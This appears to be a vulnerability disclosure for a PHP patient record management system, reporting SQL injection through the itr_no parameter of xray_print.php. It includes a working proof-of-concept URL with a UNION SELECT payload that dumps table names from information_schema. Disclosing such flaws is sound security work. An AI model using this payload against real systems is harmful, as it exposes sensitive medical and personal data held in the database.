# patient-record-management-system-in-php has sql injection in xray_print.php

## supplier 
https://code-projects.org/patient-record-management-system-in-php-with-source-code/#google_vignette
## Vulnerability parameter
xray_print.php

## describe

An unrestricted SQL injection attack exists in patient-record-management-system-in-php in xray_print.php The parameters that can be controlled are as follows: $itr_no. This function executes the id parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the value of   $itr_no parameter is obtained in function , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![Image](https://github.com/user-attachments/assets/924d8873-7ed3-437c-b70e-474ac211a124)



## POC

asset the url，can get the sql reqult on the page.

```
http://healthcarepatientrecordmanagementsystem/xray_print.php?itr_no=1'+union+select+"","","","","","","","","","","","","","","","",(SELECT+GROUP_CONCAT(table_name,"\n")+FROM+information_schema.tables+WHERE+table_schema=DATABASE()),"","","","","","","","","","",""--+
```

**Result**

![Image](https://github.com/user-attachments/assets/da004ec0-a719-44e6-8d46-8bade2099754)
